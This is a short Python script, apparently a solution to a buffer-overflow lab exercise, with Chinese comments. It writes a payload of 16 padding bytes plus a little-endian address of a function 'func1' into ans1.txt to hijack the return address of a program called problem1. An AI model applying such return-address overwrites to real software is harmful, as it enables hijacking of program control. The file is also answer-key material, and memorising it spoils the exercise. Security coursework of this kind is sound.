# solve1.py

# 1. 填充16个字节，覆盖缓冲区和旧的RBP
padding = b"A" * 16

# 2. 我们要跳转的目标函数 func1 的地址，使用小端序
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"

# 3. 将它们拼接成最终的payload
payload = padding + func1_address

# 4. 将payload以二进制形式写入文件 ans1.txt
#    这个 ans1.txt 就是你要提交给 problem1 程序的“答案”
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload has been written to ans1.txt")